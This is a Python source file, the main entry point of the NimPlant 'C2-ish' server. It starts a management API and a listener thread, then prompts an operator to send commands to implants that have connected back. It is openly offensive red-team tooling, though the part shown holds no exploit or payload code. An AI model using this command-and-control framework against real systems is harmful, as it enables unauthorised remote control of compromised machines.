#!/usr/bin/python3

# -----
#
#   NimPlant Server - The "C2-ish"™ handler for the NimPlant payload
#   By Cas van Cooten (@chvancooten)
#
# -----

import threading
import time

from .api.server import api_server, server_ip, server_port
from .util.listener import *
from .util.nimplant import *
from .util.input import *

def main(xor_key = 459457925, name = ""):
    # Set name if provided, or use the guid
    nps.set_name(name)

    # Start daemonized Flask server for API communications
    t1 = threading.Thread(name='Listener', target=api_server)
    t1.setDaemon(True)
    t1.start()
    nimplantPrint(f"Started management server on http://{server_ip}:{server_port}.")

    # Start another thread for NimPlant listener
    t2 = threading.Thread(name='Listener', target=flaskListener, args=(xor_key,))
    t2.setDaemon(True)
    t2.start()
    nimplantPrint(f"Started NimPlant listener on {listenerType.lower()}://{listenerIp}:{listenerPort}. CTRL-C to cancel waiting for NimPlants.")

    # Run main thread
    while True:
        try:
            if nps.isActiveNimPlantSelected():
                promptUserForCommand()
            elif nps.containsActiveNimPlants():
                nps.selectNextActiveNimPlant()
            else:
                pass
            time.sleep(.5)

        except KeyboardInterrupt:
            exitServerConsole()
